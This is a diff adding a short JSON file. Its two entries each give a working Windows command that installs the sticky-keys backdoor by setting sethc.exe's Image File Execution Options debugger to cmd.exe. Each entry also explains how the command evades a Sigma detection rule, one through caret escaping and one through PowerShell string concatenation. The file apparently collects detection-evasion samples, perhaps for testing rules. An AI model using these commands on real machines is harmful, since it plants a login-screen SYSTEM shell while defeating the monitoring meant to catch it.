@@ -1,0 +1,10 @@
+[
+  {
+    "output": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\seth^c.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f",
+    "explanation": "The Sigma rule relies on exact string matching for the executable name (e.g., 'sethc.exe') within the command line arguments. In the Windows Command Prompt, the caret (^) is an escape character. By inserting a caret into 'seth^c.exe', the string match in the SIEM fails, but cmd.exe still interprets and executes the path correctly as 'sethc.exe'."
+  },
+  {
+    "output": "powershell.exe -Command \"$path = 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution ' + 'Options\\sethc.exe'; New-Item -Path $path; Set-ItemProperty -Path $path -Name 'Debugger' -Value 'cmd.exe'\"",
+    "explanation": "This PowerShell command bypasses the first selection of the Sigma rule ('\\CurrentVersion\\Image File Execution Options\\') by splitting the string into two parts and concatenating them at runtime. Because the process creation event only logs the command line arguments exactly as passed, the full contiguous string is never logged, evading detection."
+  }
+]
